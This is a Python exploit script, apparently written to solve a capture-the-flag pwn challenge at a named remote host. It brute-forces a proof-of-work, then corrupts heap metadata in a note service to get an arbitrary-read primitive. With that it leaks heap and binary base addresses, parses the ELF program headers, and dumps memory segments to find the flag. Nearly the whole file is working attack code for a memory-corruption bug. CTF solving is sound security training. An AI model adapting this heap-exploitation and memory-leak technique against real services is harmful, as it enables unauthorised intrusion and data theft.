#!/usr/bin/env python3
"""Step7: parse ELF program headers from base -> locate RW (.data/.bss) segment -> scan for flag."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32763
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", bytes(b[:8]).ljust(8, b"\x00"))[0]
u16 = lambda b: struct.unpack("<H", bytes(b[:2]).ljust(2, b"\x00"))[0]
u32 = lambda b: struct.unpack("<I", bytes(b[:4]).ljust(4, b"\x00"))[0]
FLAG_RE = re.compile(rb"(?:[Ff][Ll][Aa][Gg]|[A-Za-z0-9_]{2,12})\{[!-~]{3,80}\}")


def drain(s, wait=0.8, bufsize=1 << 20):
    s.settimeout(0.2); buf = b""; end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]; fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        b = drain(self.s, 1.5)
        m1 = re.search(rb"Token:\s*([A-Za-z_]+)", b); m2 = re.search(rb"MD5:\s*([0-9a-f]{32})", b)
        if not (m1 and m2):
            raise RuntimeError("no banner")
        ans = solve_pow(m2.group(1).decode(), m1.group(1).decode())
        print("[pow] %s -> %s" % (m1.group(1).decode(), ans), flush=True)
        self.send(ans, 1.4)

    def send(self, line, wait=0.7):
        try:
            self.s.sendall(str(line).encode() + b"\n")
        except OSError:
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length); return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3); return self.send(idx, wait)

    def pack(self, idx):
        self.send(4); return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512); c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)
d = None
for _ in range(4):
    d = parse(c.show(0, wait=1.4))
    if d:
        break
A_USER = u64(d[2][0x30:0x38]) - 0x60
top = u64(d[2][0x168:0x170])
heap_start = A_USER + 0x160 + (top & ~0xf) - 0x21000
print("[heap] heap_start=0x%x A_user=0x%x" % (heap_start, A_USER), flush=True)


def arb_read(addr, n, wt=1.2):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41); p[0x20:0x28] = p64(n)
    p[0x28:0x30] = p64(n); p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())
    r = c.show(1, wait=wt + n / 8000.0)
    dd = parse(r)
    return dd[2][:n] if (dd and len(dd[2]) >= n) else None


st = arb_read(heap_start + 0x2e0, 0x10)
bptr = u64(st[0:8])
base = (bptr & ~0xfff) - 0x1000
print("[base] 0x%x (from fn 0x%x)" % (base, bptr), flush=True)

eh = arb_read(base, 0x40)
print("[elfhdr] %s" % eh.hex(), flush=True)
phoff = u64(eh[0x20:0x28]); phentsize = u16(eh[0x36:0x38]); phnum = u16(eh[0x38:0x3a])
print("[phdr] phoff=0x%x entsize=%d num=%d" % (phoff, phentsize, phnum), flush=True)

loads = []
for i in range(phnum):
    ph = arb_read(base + phoff + i * phentsize, phentsize)
    if not ph:
        print("  phdr %d read FAIL" % i, flush=True); break
    ptype = u32(ph[0:4]); flags = u32(ph[4:8]); off = u64(ph[8:16])
    vaddr = u64(ph[16:24]); filesz = u64(ph[32:40]); memsz = u64(ph[40:48])
    if ptype == 1:
        loads.append((vaddr, memsz, flags))
        print("  LOAD vaddr=0x%-7x memsz=0x%-6x filesz=0x%-6x flags=%d %s"
              % (vaddr, memsz, filesz, flags, "RW" if flags & 2 else "R"), flush=True)

flag = None
img = b""
for vaddr, memsz, flags in loads:
    start = base + vaddr
    got = b""
    for off in range(0, memsz, 0x2000):
        n = min(0x2000, memsz - off)
        b = arb_read(start + off, n, wt=1.5)
        if b is None:
            print("  seg 0x%x stop @+0x%x" % (start, off), flush=True); break
        got += b
    img += got
    print("[seg] 0x%x..0x%x got=%d flags=%d" % (start, start + memsz, len(got), flags), flush=True)
    if flags & 2:   # RW segment: look hard for flag
        for mm in FLAG_RE.finditer(got):
            print("  !!! RW FLAG @0x%x: %s" % (start + mm.start(), mm.group(0).decode()), flush=True)
        runs = re.findall(rb"[ -~]{5,}", got)
        print("  RW strings:", runs[:60], flush=True)

for mm in FLAG_RE.finditer(img):
    flag = mm.group(0).decode()
    print("!!! FLAG: %s" % flag, flush=True)
print("[done] flag=%s" % flag, flush=True)
c.s.close()